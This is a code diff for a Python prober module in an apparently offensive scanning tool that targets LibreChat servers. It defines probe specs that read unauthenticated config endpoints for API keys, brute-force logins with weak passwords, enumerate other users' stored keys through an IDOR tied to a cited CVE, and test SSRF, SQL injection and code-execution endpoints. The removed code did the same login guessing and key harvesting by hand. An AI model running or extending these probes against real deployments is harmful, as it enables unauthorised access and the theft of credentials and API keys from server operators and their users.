@@ -1,10 +1,4 @@
-"""LibreChat prober — endpoint config + user key reads.
-
-LibreChat exposes:
-  - GET /api/config → endpoint configurations (may contain API keys)
-  - GET /api/endpoints → list of configured AI endpoints
-  - GET /api/keys → user-stored API keys (requires auth, CVE-2026-31942 IDOR)
-"""
+"""LibreChat prober — config reads + weak password + true IDOR on keys."""
 
 from __future__ import annotations
 
@@ -13,9 +7,87 @@ from typing import Any
 
 from aipocket.core.models import Credential
 
-from ..base import WEAK_CREDENTIALS, Prober
+from ..base import Prober
+from ..capability import ProbeSpec, RiskLevel, VulnClass
+from ._l2l3 import rce_spec, sqli_spec, ssrf_spec
 
 log = logging.getLogger(__name__)
+
+SPECS = [
+    ProbeSpec(
+        id="librechat.unauth",
+        product="librechat",
+        vuln_class=VulnClass.UNAUTH_READ,
+        risk_level=RiskLevel.L0,
+        entry={
+            "paths": ["/api/config", "/api/endpoints", "/api/health"],
+            "tag_prefix": "librechat",
+        },
+        max_requests=4,
+    ),
+    ProbeSpec(
+        id="librechat.weak_password",
+        product="librechat",
+        vuln_class=VulnClass.WEAK_PASSWORD,
+        risk_level=RiskLevel.L1,
+        entry={
+            "auth_style": "login_json",
+            "login": "/api/auth/login",
+            "body": {"email": "{user}", "password": "{pass}", "username": "{user}"},
+            "token_fields": ["token", "access_token"],
+            # Own resources after login — not IDOR
+            "post_auth_paths": ["/api/keys", "/api/endpoints"],
+        },
+        max_requests=12,
+    ),
+    ProbeSpec(
+        id="librechat.idor.keys",
+        product="librechat",
+        vuln_class=VulnClass.IDOR,
+        risk_level=RiskLevel.L1,
+        cve_ids=("CVE-2026-31942",),
+        requires_auth=True,
+        depends_on=("librechat.weak_password",),
+        entry={
+            "list": "/api/keys",
+            "object": "/api/keys/{id}",
+            "id_enum_max": 5,
+            "id_fields": ["id", "_id", "userId", "keyId"],
+            "use_auth": True,
+        },
+        max_requests=6,
+    ),
+    ssrf_spec(
+        "librechat",
+        path="/api/files/download",
+        method="GET",
+        url_param="url",
+        use_auth=True,
+        suffix="ssrf_files",
+    ),
+    ssrf_spec(
+        "librechat",
+        path="/api/agents/tools/call",
+        url_param="url",
+        body={"tool": "web_search"},
+        use_auth=True,
+        suffix="ssrf_agents",
+    ),
+    sqli_spec(
+        "librechat",
+        path="/api/messages",
+        param="conversationId",
+        use_auth=True,
+        suffix="sqli_messages",
+    ),
+    rce_spec(
+        "librechat",
+        path="/api/run/code",
+        param="code",
+        use_auth=True,
+        suffix="rce_code",
+    ),
+]
 
 
 class LibreChatProber(Prober):
@@ -27,46 +99,4 @@ class LibreChatProber(Prober):
         return "librechat" in blob
 
     async def probe(self, hit: dict[str, Any]) -> list[Credential]:
-        creds: list[Credential] = []
-
-        # 1. Unauthenticated config reads
-        for path in ("/api/config", "/api/endpoints", "/api/health"):
-            resp = await self._get(self._url(hit, path))
-            found = self._extract_from_response(
-                resp, hit, f"librechat_{path.strip('/').replace('/', '_')}"
-            )
-            creds.extend(found)
-
-        # 2. Weak-password login → read /api/keys (CVE-2026-31942 IDOR)
-        token = await self._try_login(hit) if self._intrusive_authorized(hit) else ""
-        if token:
-            for path in ("/api/keys", "/api/endpoints"):
-                resp = await self._get(
-                    self._url(hit, path),
-                    headers={"Authorization": f"Bearer {token}"},
-                )
-                found = self._extract_from_response(
-                    resp, hit, f"librechat_authed_{path.strip('/').replace('/', '_')}"
-                )
-                creds.extend(found)
-
-        return creds
-
-    async def _try_login(self, hit: dict[str, Any]) -> str:
-        url = self._url(hit, "/api/auth/login")
-        if not url:
-            return ""
-        for username, password in WEAK_CREDENTIALS:
-            resp = await self._post(
-                url, json={"email": username, "password": password, "username": username}
-            )
-            if resp is None or resp.status_code != 200:
-                continue
-            try:
-                data = resp.json()
-            except ValueError:
-                continue
-            token = data.get("token") or data.get("access_token") or ""
-            if token:
-                return token
-        return ""
+        return await self.run_specs(hit, SPECS)
